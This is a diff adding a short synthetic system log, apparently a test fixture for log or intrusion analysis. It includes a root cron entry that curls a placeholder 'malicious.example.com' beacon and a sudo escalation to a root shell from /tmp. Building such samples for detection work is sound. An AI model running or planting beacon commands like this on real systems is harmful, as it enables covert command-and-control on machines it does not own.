@@ -1,0 +1,5 @@
+Apr 10 12:00:01 host kernel: iptables DROP IN=eth0 SRC=185.220.101.1 DST=10.0.0.1
+Apr 10 12:00:10 host cron[999]: (root) CMD (curl -s http://malicious.example.com/beacon)
+Apr 10 12:00:20 host sudo[5678]: user1 : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Apr 10 12:00:30 host kernel: Oops: general protection fault
+Apr 10 12:01:00 host systemd[1]: Started Daily apt download activities.
